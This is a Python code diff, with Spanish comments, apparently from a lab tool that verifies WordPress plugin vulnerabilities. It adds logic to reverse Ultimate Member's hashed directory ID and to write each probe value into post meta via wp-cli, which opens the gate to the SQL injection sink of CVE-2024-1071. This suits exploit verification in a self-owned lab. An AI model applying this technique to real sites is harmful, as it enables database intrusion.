@@ -196,6 +196,36 @@ def _discover_hashed_resource_id(probe: Callable[[str], bool], max_n: int = 100)
     return None
 
 
+def _reverse_hashed_resource_id(hash_value: str, max_n: int = 100) -> Optional[int]:
+    """Inverso de _discover_hashed_resource_id: dado un hash YA aceptado por el servidor
+    (el mismo esquema, md5(str(n))[10:15]), recupera el ID real `n` que lo produjo -- pura
+    computacion local, sin ninguna peticion de red, porque el esquema es conocido (confirmado
+    en vivo, Ultimate Member/CVE-2024-1071). Usado para poder escribir META REAL en el recurso
+    (ver _SQLI_CUSTOM_SORT_GATE) a partir del hash que ya viaja en la peticion, sin tener que
+    adivinar ni rastrear el ID real por ningun otro medio."""
+    for n in range(1, max_n + 1):
+        if hashlib.md5(str(n).encode()).hexdigest()[10:15] == hash_value:
+            return n
+    return None
+
+
+# algunos plugins con un "campo de orden personalizado" en sus listados/directorios (Member
+# Directory, en Ultimate Member) gatean el sumidero vulnerable detras de una comparacion EXACTA
+# contra un valor guardado en META del recurso real -- el sumidero en si (confirmado por el
+# propio parche oficial, 2.8.2 -> 2.8.3, que lo reescribe con $wpdb->prepare()) es un LEFT JOIN
+# con el valor crudo dentro de comillas simples ("...um_key = '{$sortby}'"), pero esa linea
+# NUNCA se ejecuta salvo que el valor recibido coincida EXACTO con
+# get_post_meta($directory_id, '_um_sortby_custom', true). Como el laboratorio es propio, se
+# puede escribir ESE MISMO valor en esa meta justo antes de cada intento -- abriendo la puerta
+# uno mismo en vez de depender de que ya estuviera configurada. `directory_id_param` es el
+# nombre del parametro (ya resuelto por _discover_hashed_resource_id en algun punto anterior,
+# ver _auto_resolve_wp_blockers) cuyo valor es el hash del post real; `meta_key`, la meta que
+# hay que mantener sincronizada.
+_SQLI_CUSTOM_SORT_GATE = {
+    "ultimate-member": {"meta_key": "_um_sortby_custom", "directory_id_param": "directory_id"},
+}
+
+
 def _resolve_endpoint_placeholders(endpoint: str, html_sources: list) -> tuple:
     """Si `endpoint` trae un placeholder literal sin resolver tal cual vino de un PoC publico
     (p.ej. '.../admin-ajax.php?action=x&nonce={nonce}&directory_id={dir_id}'), lo rellena con un
@@ -2169,7 +2199,25 @@ def verify_wordpress_sqli(
 
         orig_value = str(base_params.get(sqli_param) or "1")
 
+        # algunos plugins (ver _SQLI_CUSTOM_SORT_GATE) gatean el sumidero real detras de una
+        # comparacion EXACTA contra un valor guardado en META de un post real -- sin esto, se
+        # puede probar el payload correcto contra el parametro correcto y nunca confirmarse,
+        # porque el codigo vulnerable ni se ejecuta. Como el laboratorio es propio, se recupera
+        # el ID real del recurso (a partir del hash ya resuelto) y se sincroniza esa meta con
+        # CADA valor que se prueba, justo antes de enviarlo -- abriendo la puerta uno mismo.
+        gate = _SQLI_CUSTOM_SORT_GATE.get(slug)
+        gate_post_id = None
+        if gate and gate["directory_id_param"] in base_params:
+            gate_post_id = _reverse_hashed_resource_id(str(base_params[gate["directory_id_param"]]))
+            if gate_post_id is not None:
+                step(f"'{slug}' gatea el sumidero real detras de una comparacion exacta contra "
+                     f"'{gate['meta_key']}' del recurso real (post {gate_post_id}) -- se "
+                     f"sincronizara esa meta con cada valor probado antes de enviarlo")
+
         def send(val):
+            if gate_post_id is not None:
+                lab.wp_cli("post", "meta", "update", str(gate_post_id), gate["meta_key"], val,
+                          timeout=15)
             payload = dict(base_params)
             payload[sqli_param] = val
             return boot.sub_sess.request(m, boot.base_url + endpoint,
